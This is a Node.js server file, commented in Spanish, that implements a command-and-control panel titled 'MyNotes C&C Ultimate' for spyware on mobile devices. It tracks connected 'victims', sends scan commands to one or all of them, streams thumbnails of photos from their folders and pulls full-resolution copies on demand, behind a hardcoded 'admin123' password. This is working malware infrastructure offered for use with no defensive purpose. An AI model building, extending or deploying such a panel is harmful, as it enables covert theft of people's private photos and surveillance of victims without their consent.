const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

const app = express();
app.use(cors());

// --- 1. SEGURIDAD ---
const AUTH_PASS = "admin123"; // Tu contraseña

app.get('/', (req, res) => {
    if (req.query.auth !== AUTH_PASS) {
        return res.send(`
            <body style="background:#121212; color:white; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;">
                <div style="text-align:center;">
                    <h2>🔒 ACCESO RESTRINGIDO</h2>
                    <input type="password" id="pass" placeholder="Contraseña..." style="padding:10px; border-radius:5px; border:none;">
                    <button style="padding:10px; cursor:pointer;" onclick="window.location.href='/?auth='+document.getElementById('pass').value">ENTRAR</button>
                </div>
            </body>
        `);
    }

    res.send(`
    <html>
        <head>
            <title>MyNotes C&C Ultimate</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: 'Segoe UI', sans-serif; background: #121212; color: white; margin: 0; padding: 20px; }
                
                /* PANEL DE CONTROL FLOTANTE */
                .dashboard {
                    position: sticky; top: 0; z-index: 100;
                    background: #1e1e1e; padding: 15px; border-radius: 10px;
                    border: 1px solid #333; box-shadow: 0 5px 15px rgba(0,0,0,0.8);
                    margin-bottom: 20px;
                }

                .status-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; font-size: 14px; }
                #status { font-weight: bold; }
                h3 { margin: 0; color: #bbb; font-size: 12px; text-transform: uppercase; margin-bottom: 5px; }

                /* GRID DE SELECTORES */
                .selectors { display: grid; grid-template-columns: 2fr 1fr; gap: 10px; margin-bottom: 10px; }
                
                select {
                    padding: 10px; background: #2c2c2c; color: white; border: 1px solid #444; 
                    border-radius: 5px; font-weight: bold; width: 100%; outline: none;
                }
                select:focus { border-color: #2979ff; }

                /* BOTONES DE COMANDO */
                .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
                .full-width { grid-column: span 2; }
                
                button { 
                    padding: 12px; border: none; border-radius: 5px; font-weight: bold; 
                    cursor: pointer; color: white; transition: 0.2s; font-size: 13px;
                }
                
                .btn-start { background: #2979ff; } 
                .btn-start:hover { background: #1565c0; }
                
                .btn-stop { background: #d50000; } 
                .btn-stop:hover { background: #b71c1c; }

                .btn-freeze { background: #ff9100; color: black; } 
                .btn-freeze:hover { background: #ff6d00; }

                /* GRILLA DE FOTOS */
                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 8px; }
                
                .card { background: #000; border-radius: 5px; overflow: hidden; position: relative; border: 1px solid #333; animation: fadeIn 0.3s; }
                @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

                .card img { width: 100%; height: 100px; object-fit: cover; }
                .card.hd img { border-bottom: 3px solid #00e676; height: 120px; }
                
                .badge {
                    position: absolute; top: 0; right: 0; background: rgba(0,0,0,0.8); 
                    color: #fff; padding: 3px 6px; font-size: 9px; border-bottom-left-radius: 5px;
                }
            </style>
        </head>
        <body>
            <div class="dashboard">
                <div class="status-row">
                    <span>📡 ESTADO: <span id="status" style="color:#ff1744">Esperando...</span></span>
                    <span id="counter" style="color:#00e676">0 fotos</span>
                </div>

                <div class="selectors">
                    <div>
                        <h3>🎯 OBJETIVO</h3>
                        <select id="victimSelector">
                            <option value="ALL">📢 TODOS LOS DISPOSITIVOS</option>
                        </select>
                    </div>
                    
                    <div>
                        <h3>📂 CARPETA</h3>
                        <select id="folderFilter" onchange="applyFilter()">
                            <option value="ALL">Todas</option>
                        </select>
                    </div>
                </div>
                
                <div class="controls">
                    <button class="btn-start" onclick="sendCommand('start')">▶ INICIAR ESCANEO</button>
                    <button class="btn-stop" onclick="sendCommand('stop')">⏹ DETENER ESCANEO</button>
                    
                    <button id="btnFreeze" class="btn-freeze full-width" onclick="toggleFreeze()">👀 CONGELAR PANTALLA</button>
                </div>
            </div>

            <div class="grid" id="grid"></div>

            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                const grid = document.getElementById('grid');
                const victimSelector = document.getElementById('victimSelector');
                const folderFilter = document.getElementById('folderFilter');
                const counter = document.getElementById('counter');
                const btnFreeze = document.getElementById('btnFreeze');
                
                let photoCount = 0;
                let knownFolders = new Set();
                let isFrozen = false;
                let pendingBuffer = []; // Cola de espera para fotos congeladas

                // --- 1. GESTIÓN DE VÍCTIMAS ---
                socket.on('update_device_list', (devices) => {
                    const currentSelection = victimSelector.value;
                    let html = '<option value="ALL">📢 TODOS LOS DISPOSITIVOS (' + Object.keys(devices).length + ')</option>';
                    
                    for (const [socketId, info] of Object.entries(devices)) {
                        html += \`<option value="\${socketId}">📱 \${info.name} (\${info.id.substring(0,4)}...)</option>\`;
                    }
                    victimSelector.innerHTML = html;
                    
                    // Intentar mantener la selección previa si el dispositivo sigue conectado
                    if (devices[currentSelection] || currentSelection === 'ALL') {
                        victimSelector.value = currentSelection;
                    }
                });

                // --- 2. COMANDOS ---
                function sendCommand(action) {
                    const targetId = victimSelector.value;
                    const cmd = action === 'start' ? 'start_scan' : 'stop_scan';
                    
                    // Enviar comando al servidor especificando el objetivo
                    socket.emit('admin_command', { action: cmd, target: targetId });
                }

                // --- 3. LÓGICA DE CONGELAR (PAUSA) ---
                function toggleFreeze() {
                    isFrozen = !isFrozen;
                    if (isFrozen) {
                        btnFreeze.innerText = "⏸ PANTALLA CONGELADA (Acumulando...)";
                        btnFreeze.style.background = "#00bcd4"; // Cyan
                        btnFreeze.style.color = "white";
                    } else {
                        btnFreeze.innerText = "👀 CONGELAR PANTALLA";
                        btnFreeze.style.background = "#ff9100"; // Naranja
                        btnFreeze.style.color = "black";
                        
                        // Procesar todo lo acumulado de golpe
                        if (pendingBuffer.length > 0) {
                            pendingBuffer.forEach(data => processNewImage(data));
                            pendingBuffer = [];
                        }
                    }
                }

                // --- 4. RECIBIR FOTOS ---
                socket.on('new_preview', data => {
                    if (isFrozen) {
                        // Si está congelado, guardamos en memoria pero no mostramos
                        pendingBuffer.push(data);
                        btnFreeze.innerText = "▶ REANUDAR (" + pendingBuffer.length + " pendientes)";
                    } else {
                        processNewImage(data);
                    }
                });

                function processNewImage(data) {
                    // Actualizar filtro de carpetas dinámicamente
                    if (!knownFolders.has(data.folder)) {
                        knownFolders.add(data.folder);
                        const opt = document.createElement('option');
                        opt.value = data.folder;
                        opt.innerText = "📂 " + data.folder;
                        folderFilter.appendChild(opt);
                    }
                    renderCard(data);
                }

                socket.on('receive_full', data => {
                    downloadBase64File(data.image64, data.name);
                    const card = document.getElementById(data.path);
                    if(card) {
                        card.classList.add('hd');
                        card.querySelector('button').innerText = "✅ DESCARGADO";
                        card.querySelector('button').style.background = "#00c853";
                    }
                });

                // --- RENDERIZADO ---
                function renderCard(data) {
                    if(document.getElementById(data.path)) return; // Evitar duplicados
                    photoCount++;
                    counter.innerText = photoCount + " fotos";

                    const div = document.createElement('div');
                    div.className = 'card';
                    div.id = data.path;
                    div.setAttribute('data-folder', data.folder);
                    div.innerHTML = \`
                        <span class="badge">\${data.folder}</span>
                        <img src="data:image/jpeg;base64,\${data.image64}">
                        <button style="width:100%; padding:5px; background:#6200ea; border:none; color:white; font-weight:bold; cursor:pointer;" onclick="pedirHD('\${data.path}')">⚡ HD</button>
                    \`;
                    
                    // Respetar filtro de carpeta actual
                    if (folderFilter.value !== "ALL" && folderFilter.value !== data.folder) {
                        div.style.display = "none";
                    }
                    grid.prepend(div);
                }

                function applyFilter() {
                    const sel = folderFilter.value;
                    const cards = document.getElementsByClassName('card');
                    for(let c of cards) {
                        c.style.display = (sel === "ALL" || c.getAttribute('data-folder') === sel) ? "block" : "none";
                    }
                }

                function pedirHD(path) { 
                    socket.emit('order_download', { path: path }); 
                }

                function downloadBase64File(base64Data, fileName) {
                    const link = document.createElement('a');
                    link.href = "data:image/jpeg;base64," + base64Data;
                    link.download = fileName;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                }
                
                socket.on('connection_alert', msg => {
                    document.getElementById('status').innerText = msg;
                    document.getElementById('status').style.color = msg.includes("Admin") ? "#00e676" : "#ff1744";
                });
            </script>
        </body>
    </html>
    `);
});

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" }, allowEIO3: true, maxHttpBufferSize: 1e8 });

// ALMACÉN DE VÍCTIMAS
let victims = {};

io.on('connection', (socket) => {
    
    // 1. Identificar conexión
    socket.on('usrData', (data) => {
        // Registro de dispositivo
        if (data.dataType === 'register_device') {
            victims[socket.id] = { name: data.deviceName, id: data.deviceId };
            console.log(`📱 Nueva Víctima: ${data.deviceName} (${socket.id})`);
            io.emit('update_device_list', victims); // Actualizar selectores
        }
        // Fotos
        else if (data.dataType === 'preview_image') {
            io.emit('new_preview', data); 
        }
        else if (data.dataType === 'full_image') {
            io.emit('receive_full', data);
        }
    });

    // 2. Comandos Admin (Ahora con target)
    socket.on('admin_command', (cmd) => {
        if (cmd.target === 'ALL') {
            socket.broadcast.emit('command_' + cmd.action); // A todos
        } else if (victims[cmd.target]) {
            io.to(cmd.target).emit('command_' + cmd.action); // A uno específico
        }
    });

    socket.on('order_download', (data) => socket.broadcast.emit('request_full_image', data));

    // 3. Desconexión
    socket.on('disconnect', () => {
        if (victims[socket.id]) {
            console.log(`❌ Se fue: ${victims[socket.id].name}`);
            delete victims[socket.id];
            io.emit('update_device_list', victims);
        }
    });
    
    // Al conectar Admin, enviar lista actual
    socket.emit('update_device_list', victims);
    socket.emit('connection_alert', '✅ Panel Admin Conectado');
});

server.listen(process.env.PORT || 3000, () => console.log('Servidor Ultimate Listo'));
